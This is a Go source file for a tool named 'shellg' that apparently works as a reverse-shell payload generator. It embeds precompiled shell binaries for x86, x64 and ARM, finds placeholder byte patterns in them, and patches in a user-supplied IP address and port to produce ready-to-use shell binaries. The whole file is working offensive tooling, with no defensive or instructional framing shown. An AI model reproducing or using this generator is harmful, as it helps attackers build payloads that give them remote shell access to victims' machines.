package main

import (
	"embed"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"log"
	"os"
)

//go:embed shells/bin/*
var binDir embed.FS


var archFlag string
var hostFlag string
var portFlag int
var debugFlag bool = true

// 192.168.222.123 <- Example
var hostEgg = [17]byte{0x43,0x43,0x43,0x43,0x43,0x43,0x43,0x43,0x43,0x43,0x43,0x43,0x43,0x43,0x43,0x43,0x43}

// 9999 4 byte int
var portEgg = [4]byte{0x41,0x41,0x41,0x41}

func errorPrint(location string, message string, err error) {
    if err != nil {
        fmt.Fprintf(os.Stderr,"::ERROR::%s::%s::%v::\n",location,message,err)
        return
    }
    fmt.Fprintf(os.Stderr,"::ERROR::%s::%s::\n",location,message)
}

func infoPrint(location string, message string) {
    fmt.Fprintf(os.Stdout,"::INFO::%s::%s::\n",location,message)
}

func debugPrint(items ...interface{}) {
    if (debugFlag){
        for _, item := range items {
            fmt.Fprintf(os.Stderr,"::DEBUG::%v\n",item)
        }
    }
}

func checkRequired() error{
    if archFlag == "" {
        return errors.New("Failed to provide arch");
    }
    if hostFlag == "" {
        return errors.New("Failed to provide ip");
    }
    if portFlag == 0 {
        return errors.New("Failed to provide port");
    }
    if len(hostFlag) > 16 {
        return errors.New("Host flag too long");
    }	
	if portFlag > 65535 {
        return errors.New("Port flag greater than 65535");
	}
    return nil
}


func compare(a []byte, b []byte) bool {
    if len(a) != len(b){
        return false
    }
    for i := 0; i < len(a); i++ {
        if a[i] != b[i] {
            return false
        }
    }
    return true
}

func replaceBytes(data []byte, egg []byte, replacement []byte) []byte {
    var start int
    var end int
    for i := 0; i < len(data) - len(egg); i++ {
        chunk := data[i:len(egg) + i]
        if compare(chunk,egg) {
            start = i
            end = len(egg) + i
            copy(data[start:end],replacement)
            return data
        }
    }
    return nil
}


func convertArgsToBytes(host string, port int) ([]byte,[]byte){
    hostTmp := []byte(host)
    hostBytes := make([]byte,17)
    copy(hostBytes,hostTmp) // should fill the rest with zeros
    portBytes := make([]byte,4)
    binary.LittleEndian.PutUint32(portBytes,uint32(port))
    return hostBytes,portBytes
}


func generate(arch string){
    shell64Bytes, err := binDir.ReadFile(fmt.Sprintf("shells/bin/shell%s",arch))
    if err != nil {
        errorPrint("main","failed to read embedded file",err)
        os.Exit(-1)
    }
    infoPrint("generate",fmt.Sprintf("arch %s",archFlag))
    infoPrint("generate",fmt.Sprintf("host %s",hostFlag))
    infoPrint("generate",fmt.Sprintf("port %d",portFlag))
    h,p := convertArgsToBytes(hostFlag,portFlag)
    replacedHost := replaceBytes(shell64Bytes,hostEgg[:],h)
    replacedPort := replaceBytes(replacedHost,portEgg[:],p)
    name := fmt.Sprintf("shell%s.%s.%d.bin",arch,hostFlag,portFlag)
    infoPrint("generate",fmt.Sprintf("generated %s",name))
    err = os.WriteFile(name,replacedPort,0644)
    if err != nil {
        log.Fatal(err)
    }
}


func printWhale(){
	fmt.Printf(":::::::::::::::\n")
    fmt.Printf(`
shellg

 __v_
(____\/{
        `)
	fmt.Printf("\n")
	fmt.Printf("----------------\n")
}

func main(){
	printWhale()
    flag.StringVar(&archFlag,"arch","","x64, x32, x64_arm, x64_static, x32_static")
    flag.StringVar(&archFlag,"a","","")
    flag.StringVar(&hostFlag,"host","","ip")
    flag.StringVar(&hostFlag,"h","","")
    flag.IntVar(&portFlag,"port",0,"port")
    flag.IntVar(&portFlag,"p",0,"")
    flag.Parse()
    err := checkRequired()  
    if err != nil {
        errorPrint("main","argument error",err)
        return
    }
    switch (archFlag){
    case "x64_arm":
        generate("64_arm")
    case "x64":
        generate("64")
    case "x32":
       generate("32")
    case "x64_static":
        generate("64_static")
    case "x32_static":
       generate("32_static")
    default:
		flag.PrintDefaults()
        return
    }
}
